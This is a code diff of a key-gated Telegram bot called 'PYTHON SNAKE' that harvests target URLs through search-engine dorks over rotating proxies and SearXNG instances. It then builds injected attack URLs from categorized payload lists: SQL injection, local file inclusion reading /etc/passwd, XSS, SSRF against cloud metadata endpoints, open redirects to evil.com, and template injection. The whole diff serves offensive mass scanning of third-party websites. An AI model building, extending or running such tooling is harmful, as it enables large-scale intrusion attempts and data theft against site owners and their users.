@@ -63,7 +63,7 @@ BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
 ADMIN_IDS = [8999053405]
 ADMIN_USERNAME = "@Bloody_sweet_baby"
 BRAND = "PYTHON SNAKE"
-VERSION = "v1.1"
+VERSION = "v1.2"
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 DATA_DIR = os.path.join(BASE_DIR, "data")
@@ -728,9 +728,45 @@ def randomize_dorks(dorks: list, n: int = 30, mutate: bool = True) -> list:
 
 
 # ── INJECTOR ─────────────────────────────────────────────────────────────────
-PAYLOADS = ["'", '"', "1'", "1 AND 1=1", "1' AND '1'='1", "1)", "' OR 1=1-- -",
-            "%27", "%22", "1%20AND%201=1", "1 UNION SELECT NULL-- -"]
+PAYLOAD_CATS = {
+    "sqli": [
+        "'", '"', "1'", "1)", "1 AND 1=1", "1 AND 1=2", "1' AND '1'='1",
+        "1' AND '1'='2", "' OR '1'='1", "' OR 1=1-- -", "1 UNION SELECT NULL-- -",
+        "1 UNION SELECT NULL,NULL-- -", "' AND SLEEP(5)-- -", "1;WAITFOR DELAY '0:0:5'--",
+        "' AND 1=CONVERT(int,@@version)-- -", "1' ORDER BY 1-- -", "1' ORDER BY 99-- -",
+        "admin'-- -", "' OR 'x'='x", "1%20AND%201=1", "1%27", "%27",
+    ],
+    "lfi": [
+        "../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd",
+        "....//....//....//etc/passwd", "/etc/passwd", "php://filter/convert.base64-encode/resource=index",
+        "php://filter/read=convert.base64-encode/resource=config", "/proc/self/environ",
+        "C:\\Windows\\win.ini", "..\\..\\..\\windows\\win.ini",
+        "/etc/hosts", "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "file:///etc/passwd",
+    ],
+    "xss": [
+        "<script>alert(1)</script>", '"><script>alert(1)</script>', "'><svg onload=alert(1)>",
+        "javascript:alert(1)", "%3Cscript%3Ealert(1)%3C/script%3E",
+        '"><img src=x onerror=alert(1)>', "'-alert(1)-'", "\"><svg/onload=alert(1)>",
+    ],
+    "ssrf": [
+        "http://127.0.0.1", "http://localhost", "http://169.254.169.254/latest/meta-data/",
+        "http://[::1]", "http://0.0.0.0", "http://127.0.0.1:22", "http://127.0.0.1:80",
+        "file:///etc/passwd", "dict://127.0.0.1:6379/info", "gopher://127.0.0.1:6379/_INFO",
+    ],
+    "redirect": [
+        "https://evil.com", "//evil.com", "https://evil.com/%2f..", "/\\evil.com",
+        "https://evil.com?x=1", "///evil.com", "http://evil.com@target.com",
+        "https://target.com@evil.com",
+    ],
+    "ssti": [
+        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{7*'7'}}",
+        "{{config}}", "{{self.__class__}}", "${{7*7}}",
+    ],
+}
+PAYLOADS = _uniq([x for v in PAYLOAD_CATS.values() for x in v])
 PARAM_FUZZ = ["id", "page", "cat", "item", "product_id", "user", "file", "path", "url", "search"]
+CAT_LABEL = {"all": "🎯 ALL", "sqli": "💉 SQLi", "lfi": "📂 LFI", "xss": "🧪 XSS",
+             "ssrf": "🌐 SSRF", "redirect": "↪️ REDIRECT", "ssti": "🧬 SSTI"}
 
 
 def inject_targets(urls: list, payload: str = "", params: list = None) -> list:
@@ -755,9 +791,15 @@ def inject_targets(urls: list, payload: str = "", params: list = None) -> list:
     return _uniq(out)
 
 
-def inject_all_payloads(urls: list) -> list:
+def payloads_for(cat: str = "all") -> list:
+    if not cat or cat == "all":
+        return list(PAYLOADS)
+    return list(PAYLOAD_CATS.get(cat) or PAYLOADS)
+
+
+def inject_all_payloads(urls: list, cat: str = "all") -> list:
     out = []
-    for pl in PAYLOADS:
+    for pl in payloads_for(cat):
         out += inject_targets(urls, pl)
     return _uniq(out)
 
@@ -1107,17 +1149,112 @@ JUNK_EXT = {".css", ".js", ".woff", ".woff2", ".ttf", ".eot", ".ico", ".svg", ".
             ".jpg", ".jpeg", ".gif", ".webp", ".mp4", ".mp3", ".avi", ".map"}
 
 ENGINE_URLS = {
-    "ddg":     "https://html.duckduckgo.com/html/?q={q}",
-    "bing":    "https://www.bing.com/search?q={q}&count=30&setlang=en",
-    "mojeek":  "https://www.mojeek.com/search?q={q}",
-    "yahoo":   "https://search.yahoo.com/search?p={q}&n=30",
-    "brave":   "https://search.brave.com/search?q={q}",
-    "startpage": "https://www.startpage.com/sp/search?query={q}",
-    "google":  "https://www.google.com/search?q={q}&num=30&hl=en",
-    "searx":   "https://searx.be/search?q={q}&format=json",
+    "ddg":       "https://html.duckduckgo.com/html/?q={q}&s={p}",
+    "bing":      "https://www.bing.com/search?q={q}&first={p}&count=30&setlang=en",
+    "mojeek":    "https://www.mojeek.com/search?q={q}&s={p}",
+    "yahoo":     "https://search.yahoo.com/search?p={q}&b={p}&n=30",
+    "brave":     "https://search.brave.com/search?q={q}&offset={p}",
+    "startpage": "https://www.startpage.com/sp/search?query={q}&page={p}",
+    "google":    "https://www.google.com/search?q={q}&num=30&hl=en&start={p}",
+    "yandex":    "https://yandex.com/search/?text={q}&p={p}",
+    "qwant":     "https://www.qwant.com/?q={q}&p={p}&t=web",
+    "ecosia":    "https://www.ecosia.org/search?q={q}&p={p}",
+    "marginalia": "https://search.marginalia.nu/search?query={q}&s={p}",
+    "searx":     "https://searx.be/search?q={q}&format=json&pageno={p}",
 }
-ENGINE_ORDER = ["ddg", "bing", "mojeek", "yahoo", "brave", "startpage", "searx", "google"]
+
+# (start, step) — har engine ka pagination offset
+ENGINE_PAGE = {
+    "ddg": (0, 30), "bing": (1, 10), "mojeek": (0, 10), "yahoo": (1, 10),
+    "google": (0, 30), "brave": (0, 20), "startpage": (1, 10), "yandex": (0, 10),
+    "qwant": (1, 10), "ecosia": (1, 10), "marginalia": (0, 10), "searx": (1, 1),
+    "sxng": (1, 1),
+}
+
+ENGINE_ORDER = ["sxng", "ddg", "bing", "mojeek", "yahoo", "brave", "startpage",
+                "yandex", "qwant", "ecosia", "google", "marginalia", "searx"]
 ENGINE_MISS = {}      # engine -> consecutive empty/blocked count
+
+# ── SearXNG — public instances (searx.space se khud update hote hain) ────────
+SEARX_FALLBACK = [
+    "https://searx.be", "https://baresearch.org", "https://search.inetol.net",
+    "https://priv.au", "https://searxng.site", "https://search.bus-hit.me",
+    "https://searx.tiekoetter.com", "https://opnxng.com", "https://search.sapti.me",
+    "https://paulgo.io", "https://searx.work", "https://search.hbubli.cc",
+]
+SEARX_INSTANCES = {"t": 0.0, "list": []}
+
+
+async def searx_instances(force: bool = False) -> list:
+    """searx.space/data/instances.json se chalti-phirti instances."""
+    now = time.time()
+    if not force and SEARX_INSTANCES["list"] and (now - SEARX_INSTANCES["t"] < 6 * 3600):
+        return SEARX_INSTANCES["list"]
+    # disk cache
+    if not force:
+        d = jload("searx_instances", {})
+        if d.get("list") and (now - float(d.get("t") or 0) < 24 * 3600):
+            SEARX_INSTANCES.update({"t": float(d.get("t") or 0), "list": d["list"]})
+            return d["list"]
+    good = []
+    try:
+        async with aiohttp.ClientSession() as s:
+            async with s.get("https://searx.space/data/instances.json",
+                             headers=UA, ssl=False,
+                             timeout=aiohttp.ClientTimeout(total=20)) as r:
+                if r.status == 200:
+                    j = await r.json(content_type=None)
+                    for base, meta in (j.get("instances") or {}).items():
+                        try:
+                            http = meta.get("http") or {}
+                            search = (meta.get("timing") or {}).get("search") or {}
+                            if http.get("status_code") != 200:
+                                continue
+                            if float(search.get("success_percentage") or 0) < 70:
+                                continue
+                            if (meta.get("network_type") or "normal") != "normal":
+                                continue
+                            good.append(base.rstrip("/"))
+                        except Exception:
+                            continue
+    except Exception:
+        good = []
+    if not good:
+        good = list(SEARX_FALLBACK)
+    good = _uniq(good)[:30]
+    SEARX_INSTANCES.update({"t": now, "list": good})
+    jsave("searx_instances", {"t": now, "list": good})
+    return good
+
+
+async def fetch_sxng(session, dork: str, page: int = 1, proxy=None,
+                     timeout: float = 12.0) -> list:
+    """SearXNG se results — pehle JSON, phir HTML fallback. Instance rotate."""
+    inst = await searx_instances()
+    random.shuffle(inst)
+    for base in inst[:3]:
+        for fmt in ("json", "html"):
+            url = "%s/search?q=%s&pageno=%d&language=en&safesearch=0" % (
+                base, quote_plus(dork), max(1, page))
+            if fmt == "json":
+                url += "&format=json"
+            kw = {"headers": UA, "timeout": aiohttp.ClientTimeout(total=timeout),
+                  "ssl": False, "allow_redirects": True}
+            if proxy:
+                kw["proxy"] = proxy
+            try:
+                async with session.get(url, **kw) as r:
+                    if r.status != 200:
+                        continue
+                    body = await r.text(errors="ignore")
+                    if not body:
+                        continue
+                    urls = extract_urls("sxng", body)
+                    if urls:
+                        return urls
+            except Exception:
+                continue
+    return []
 
 
 def _clean_url(u: str) -> str:
@@ -1177,14 +1314,47 @@ def extract_urls(engine: str, body: str) -> list:
         except Exception:
             for m in re.finditer(r'<a[^>]+href="(https?://[^"]+)"', body):
                 out.append(m.group(1))
+    elif engine == "sxng":
+        # JSON API
+        ok_json = False
+        try:
+            j = json.loads(body)
+            ok_json = True
+            for r in (j.get("results") or []):
+                out.append(str(r.get("url") or ""))
+        except Exception:
+            pass
+        if not ok_json:
+            # HTML — searxng result links <a class="url_header" href=...> / h3 a
+            for m in re.finditer(r'<a[^>]+class="[^"]*url_header[^"]*"[^>]+href="([^"]+)"', body):
+                out.append(m.group(1))
+            for m in re.finditer(r'<h3>\s*<a[^>]+href="(https?://[^"]+)"', body):
+                out.append(m.group(1))
+            for m in re.finditer(r'<a[^>]+href="(https?://[^"]+)"[^>]+rel="noreferrer"', body):
+                out.append(m.group(1))
+    elif engine == "yandex":
+        for m in re.finditer(r'<a[^>]+class="[^"]*Link[^"]*"[^>]+href="(https?://[^"]+)"', body):
+            out.append(m.group(1))
+        for m in re.finditer(r'href="(https?://[^"]+)"[^>]*target="_blank"', body):
+            out.append(m.group(1))
+    elif engine in ("qwant", "ecosia", "marginalia"):
+        for m in re.finditer(r'<a[^>]+href="(https?://[^"]+)"', body):
+            out.append(m.group(1))
     return _uniq([x for x in (_clean_url(u) for u in out) if x])
 
 
-async def fetch_engine(session, engine: str, dork: str, proxy=None, timeout: float = 15.0) -> list:
+async def fetch_engine(session, engine: str, dork: str, proxy=None,
+                       timeout: float = 15.0, page: int = 0) -> list:
+    if engine == "sxng":
+        return await fetch_sxng(session, dork, page=max(1, page + 1), proxy=proxy, timeout=timeout)
     url = ENGINE_URLS.get(engine)
     if not url:
         return []
-    target = url.format(q=quote_plus(dork))
+    base, step = ENGINE_PAGE.get(engine, (0, 10))
+    try:
+        target = url.format(q=quote_plus(dork), p=base + int(page) * step)
+    except Exception:
+        target = url.format(q=quote_plus(dork))
     hdrs = dict(UA)
     hdrs["Referer"] = "https://www.google.com/"
     kw = {"headers": hdrs, "timeout": aiohttp.ClientTimeout(total=timeout),
@@ -1231,6 +1401,52 @@ async def wayback_urls(domain: str, limit: int = 300, proxy=None) -> list:
         return []
 
 
+_STRICT_INURL = re.compile(r'(?:inurl|allinurl):\s*\(?"?([^"\s)]+)', re.I)
+_STRICT_EXT = re.compile(r'(?:filetype|ext):\s*\(?"?([a-z0-9]{2,6})', re.I)
+
+
+def dork_match(url: str, dork: str) -> bool:
+    """URL ko dork ke inurl / filetype constraints se match karta hai.
+
+    intitle / intext verify nahi ho sakte (page fetch chahiye) — unhe skip
+    karte hain. OR (|) wale dork pe bhi skip.
+    """
+    if not url or not dork:
+        return True
+    if "|" in dork:
+        return True
+    low = url.lower()
+    path = low.split("?")[0]
+    ok = True
+
+    inurls = _STRICT_INURL.findall(dork)
+    for pat in inurls:
+        pat = pat.strip().lower()
+        if not pat:
+            continue
+        if pat in low:
+            continue
+        # '?id=' jaisa pattern — query me bas key check karo
+        if "=" in pat and "?" in pat:
+            key = pat.split("=")[0].split("?")[-1]
+            if key and (("?" + key + "=") in low or ("&" + key + "=") in low):
+                continue
+        return False
+
+    exts = _STRICT_EXT.findall(dork)
+    for e in exts:
+        e = e.lower()
+        if path.endswith("." + e):
+            continue
+        if ("." + e + "/") in path or ("." + e + "?") in low:
+            continue
+        # sub-path me extension ho sakta hai
+        if ("." + e) in path:
+            continue
+        return False
+    return ok
+
+
 def _pick_proxy() -> str:
     pool = PROXIES or load_proxy_pool()
     if not pool:
@@ -1239,7 +1455,7 @@ def _pick_proxy() -> str:
 
 
 async def parse(dorks: list, max_urls: int = 200, pages: int = 1, engines: list = None,
-                use_proxy: bool = True, progress=None) -> dict:
+                use_proxy: bool = True, progress=None, strict: bool = True) -> dict:
     """Dork list → real URLs. Engine rotate + proxy rotate + 2 round retry."""
     engines = engines or ENGINE_ORDER
     max_urls = max(1, min(20000, int(max_urls or 200)))
@@ -1258,7 +1474,7 @@ async def parse(dorks: list, max_urls: int = 200, pages: int = 1, engines: list 
             for page in range(pages):
                 if len(found) >= max_urls:
                     break
-                q = dork if page == 0 else ("%s&start=%d" % (dork, page * 10))
+                q = dork
                 got = 0
                 tried = 0
                 order = list(engines)
@@ -1271,11 +1487,16 @@ async def parse(dorks: list, max_urls: int = 200, pages: int = 1, engines: list 
                         break
                     tried += 1
                     proxy = _pick_proxy() if use_proxy else None
-                    urls = await fetch_engine(session, eng, q, proxy)
+                    urls = await fetch_engine(session, eng, q, proxy, page=page)
                     stats["queries"] += 1
                     if not urls:
                         stats["blocked"] += 1
                         continue
+                    # strict: URL ko dork ke inurl/filetype se match karo
+                    if strict:
+                        matched = [u for u in urls if dork_match(u, dork)]
+                        if matched:
+                            urls = matched
                     stats["engine_hits"][eng] += len(urls)
                     for u in urls:
                         k = u.split("#")[0]
@@ -1540,6 +1761,26 @@ async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data.startswith("a:"):
         return await admin_callback(update, context, data[2:])
 
+    # ── tool sub-buttons (dd / pr / rd / df / px / inj) ──
+    if data.startswith(("dd:", "pr:", "rd:", "df:", "px:", "inj:")):
+        if not access_ok(uid):
+            try:
+                await q.edit_message_text(need_key_text(uid), reply_markup=kb_needkey(),
+                                          parse_mode=ParseMode.HTML)
+            except Exception:
+                pass
+            return
+        try:
+            return await _route_tool_cb(update, context, data)
+        except Exception as exc:
+            logger.exception("tool-cb %s fail: %s", data, exc)
+            try:
+                await q.edit_message_text("❌ Error: <code>%s</code>" % esc(str(exc)[:200]),
+                                          parse_mode=ParseMode.HTML, reply_markup=kb_back())
+            except Exception:
+                pass
+            return
+
     # ── menu ──
     if not data.startswith("m:"):
         return
@@ -1576,6 +1817,39 @@ async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                           parse_mode=ParseMode.HTML, reply_markup=kb_back())
             except Exception:
                 pass
+
+
+async def _route_tool_cb(update, context, data: str):
+    """dd: pr: rd: df: px: inj: — in sab ka dispatcher."""
+    head, _, rest = data.partition(":")
+    if head == "dd":
+        if rest.startswith("mode:"):
+            return await cb_dork_mode(update, context, rest[5:])
+    elif head == "pr":
+        if rest == "last":
+            return await cb_parse_last(update, context)
+        if rest == "manual":
+            return await cb_parse_manual(update, context)
+    elif head == "rd":
+        if rest == "last":
+            return await cb_rand_last(update, context)
+        if rest == "manual":
+            return await cb_rand_manual(update, context)
+    elif head == "df":
+        return await cb_dump_file(update, context)
+    elif head == "px":
+        if rest == "run":
+            return await cb_proxy_run(update, context)
+        if rest == "stat":
+            return await cb_proxy_stat(update, context)
+        if rest == "clear":
+            return await cb_proxy_clear(update, context)
+    elif head == "inj":
+        if rest == "last":
+            return await cb_inj_last(update, context)
+        if rest.startswith("cat:"):
+            return await cb_inj_cat(update, context, rest[4:])
+    logger.warning("unknown tool callback: %s", data)
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -1752,19 +2026,33 @@ async def input_rev_urls(update, context, text: str):
 # ═══════════════════════════════════════════════════════════════════════════════
 async def tool_inj(update, context):
     q = update.callback_query
-    txt = (H("INJECTOR") + "\n\n"
-           "URLs paste karo (ya pichhle parser result use karo):\n\n"
-           "<code>https://target.com/product.php?id=1</code>\n\n"
-           "Har URL ke param me payload daal ke test URLs banaunga.")
-    kb = InlineKeyboardMarkup([
-        [InlineKeyboardButton("📥 LAST PARSER RESULTS", callback_data="inj:last")],
-        [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")],
-    ])
+    cat = context.user_data.get("inj_cat", "all")
+    rows = []
+    keys = list(CAT_LABEL.keys())
+    for i in range(0, len(keys), 3):
+        row = []
+        for k in keys[i:i + 3]:
+            label = CAT_LABEL[k] + ("  ✅" if k == cat else "")
+            row.append(InlineKeyboardButton(label, callback_data="inj:cat:" + k))
+        rows.append(row)
+    rows.append([InlineKeyboardButton("📥 LAST PARSER RESULTS", callback_data="inj:last")])
+    rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:home")])
+    txt = (H("INJECTOR", "%d payloads • %d categories" % (len(PAYLOADS), len(PAYLOAD_CATS))) + "\n\n"
+           "Category chuno: <b>%s</b> (%d payloads)\n\n"
+           "Phir URLs bhejo — har param me payload daal ke test URLs banaunga.\n\n"
+           "<code>https://target.com/product.php?id=1</code>"
+           % (CAT_LABEL.get(cat, cat), len(payloads_for(cat))))
     try:
-        await q.edit_message_text(txt, reply_markup=kb, parse_mode=ParseMode.HTML)
+        await q.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(rows),
+                                  parse_mode=ParseMode.HTML)
     except Exception:
         pass
     context.user_data["await"] = "inj_urls"
+
+
+async def cb_inj_cat(update, context, cat: str):
+    context.user_data["inj_cat"] = cat if cat in CAT_LABEL else "all"
+    return await tool_inj(update, context)
 
 
 async def cb_inj_last(update, context):
@@ -1772,7 +2060,7 @@ async def cb_inj_last(update, context):
     urls = context.user_data.get("last_urls") or []
     if not urls:
         try:
-            await q.answer("Pehle parser chalao", show_alert=True)
+            await q.answer("Pehle PARSER chalao", show_alert=True)
         except Exception:
             pass
         return
@@ -1788,22 +2076,37 @@ async def input_inj_urls(update, context, text: str):
 
 
 async def _run_inject(update, context, urls):
+    cat = context.user_data.get("inj_cat", "all")
+    msg = None
+    try:
+        msg = await update.effective_message.reply_text("💉 Targets ban rahe hain…")
+    except Exception:
+        pass
     t0 = time.time()
-    out = inject_all_payloads(urls)
+    out = inject_all_payloads(urls, cat)
     took = time.time() - t0
     if not out:
-        await update.effective_message.reply_text("❌ Kuch nahi bana.")
+        if msg:
+            try:
+                await msg.edit_text("❌ Kuch nahi bana.")
+            except Exception:
+                pass
         return
-    path, cnt = dump_text(out, "inject", "PYTHON SNAKE — injector targets")
-    txt = (H("INJECTOR — DONE") + "\n\n"
+    path, cnt = dump_text(out, "inject_" + cat, "PYTHON SNAKE — injector (%s)" % cat)
+    txt = (H("INJECTOR — DONE", CAT_LABEL.get(cat, cat)) + "\n\n"
            "🎯 Input URLs : <code>%s</code>\n"
            "💉 Payloads   : <code>%d</code>\n"
            "✅ Targets    : <code>%s</code>\n"
            "⏱ Time       : <code>%.2fs</code>\n\n%s"
-           % (fmt(len(urls)), len(PAYLOADS), fmt(cnt), took, short_list(out[:8], 8)))
+           % (fmt(len(urls)), len(payloads_for(cat)), fmt(cnt), took, short_list(out[:8], 8)))
+    if msg:
+        try:
+            await msg.delete()
+        except Exception:
+            pass
     await update.effective_message.reply_text(txt, parse_mode=ParseMode.HTML,
                                               reply_markup=kb_back("m:inj"))
-    await send_file(update, path, "💉 %d injection targets" % cnt)
+    await send_file(update, path, "💉 %d %s targets" % (cnt, cat))
     context.user_data.pop("await", None)
 
 
